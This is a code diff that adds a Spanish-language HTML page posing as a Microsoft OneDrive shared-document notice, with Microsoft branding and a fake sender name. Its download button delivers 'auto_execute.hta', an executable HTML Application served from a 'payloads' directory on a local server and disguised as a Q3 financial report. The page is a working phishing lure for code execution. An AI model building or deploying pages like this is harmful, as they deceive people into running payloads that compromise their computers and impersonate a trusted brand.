@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>OneDrive - Documento compartido</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #f3f2f1; }
+        .container { max-width: 600px; margin: 50px auto; background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); padding: 40px; text-align: center; }
+        .logo { width: 120px; margin-bottom: 20px; }
+        h1 { color: #323130; font-size: 24px; margin-bottom: 10px; }
+        p { color: #605e5c; margin-bottom: 30px; }
+        .file-box { border: 1px solid #e1dfdd; border-radius: 8px; padding: 20px; margin: 20px 0; display: flex; align-items: center; gap: 15px; text-align: left; }
+        .file-icon { font-size: 40px; }
+        .file-info { flex: 1; }
+        .file-name { font-weight: 600; color: #323130; }
+        .file-meta { color: #605e5c; font-size: 13px; }
+        .btn { background: #0078d4; color: white; border: none; padding: 12px 32px; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; }
+        .btn:hover { background: #005a9e; }
+        .footer { margin-top: 30px; color: #a19f9d; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="logo" viewBox="0 0 23 23">
+            <path fill="#0078d4" d="M1 1h10v10H1z"/>
+            <path fill="#00a4ef" d="M12 1h10v10H12z"/>
+            <path fill="#7fba00" d="M1 12h10v10H1z"/>
+            <path fill="#ffb900" d="M12 12h10v10H12z"/>
+        </svg>
+        <h1>📎 Documento compartido</h1>
+        <p>María González ha compartido un archivo contigo</p>
+        <div class="file-box">
+            <div class="file-icon">📊</div>
+            <div class="file-info">
+                <div class="file-name">Reporte_Financiero_Q3.hta</div>
+                <div class="file-meta">OneDrive HTML Application • 2.4 KB</div>
+            </div>
+        </div>
+        <a href="http://192.168.1.6:8000/static/payloads/auto_execute.hta" class="btn" download>📥 Abrir documento</a>
+        <p class="footer">Este enlace expira en 7 días.<br>Microsoft OneDrive • Protegido por Microsoft 365</p>
+    </div>
+</body>
+</html>
